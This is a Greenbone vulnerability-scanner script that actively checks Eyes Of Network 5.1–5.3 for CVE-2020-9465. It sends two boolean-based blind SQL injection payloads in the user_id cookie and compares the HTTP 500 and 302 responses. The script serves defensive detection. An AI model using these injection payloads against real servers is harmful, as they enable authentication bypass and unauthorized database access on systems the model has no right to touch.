# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:eyes_of_network:eyes_of_network";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143573");
  script_version("2025-09-10T05:38:24+0000");
  script_tag(name:"last_modification", value:"2025-09-10 05:38:24 +0000 (Wed, 10 Sep 2025)");
  script_tag(name:"creation_date", value:"2020-03-04 05:43:14 +0000 (Wed, 04 Mar 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-23 15:07:00 +0000 (Tue, 23 Feb 2021)");

  script_cve_id("CVE-2020-9465");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Eyes Of Network (EON) 5.1 < 5.3-3 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_eyesofnetwork_consolidation.nasl");
  script_mandatory_keys("eyesofnetwork/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Eyes Of Network (EON) is prone to an unauthenticated SQL
  injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends crafted HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"The eonweb web interface is prone to an SQL injection, allowing an
  unauthenticated attacker to perform various tasks such as authentication bypass via the user_id field in a cookie.");

  script_tag(name:"affected", value:"Eyes Of Network versions 5.1 - 5.3.");

  script_tag(name:"solution", value:"Update to version 5.3-3 or later.");

  script_xref(name:"URL", value:"https://github.com/EyesOfNetworkCommunity/eonweb/issues/51");
  script_xref(name:"URL", value:"https://github.com/EyesOfNetworkCommunity/eonweb/releases/tag/5.3-3");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php";

cookie1 = "user_id=1' RLIKE (SELECT (CASE WHEN (2550=2551) THEN 1 ELSE 0x28 END))-- qMSU";
cookie2 = "user_id=1' RLIKE (SELECT (CASE WHEN (2550=2550) THEN 1 ELSE 0x28 END))-- qMSU";

headers = make_array("Cookie", cookie1);
req = http_get_req(port: port, url: url, add_headers: headers);
res1 = http_keepalive_send_recv(port: port, data: req);

if (res1 !~ "^HTTP/1\.[01] 500")
  exit(0);

headers = make_array("Cookie", cookie2);
req = http_get_req(port: port, url: url, add_headers: headers);
res2 = http_keepalive_send_recv(port: port, data: req);

if (res2 =~ "^HTTP/1\.[01] 302") {
  report = 'The responses indicate that blind SQL injection is possible.\n\n' +
           'Set Cookie1: ' + cookie1 + '\n\nResponse:\n' + res1 +
           'Set Cookie2: ' + cookie2 + '\n\nResponse:\n' + res2;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
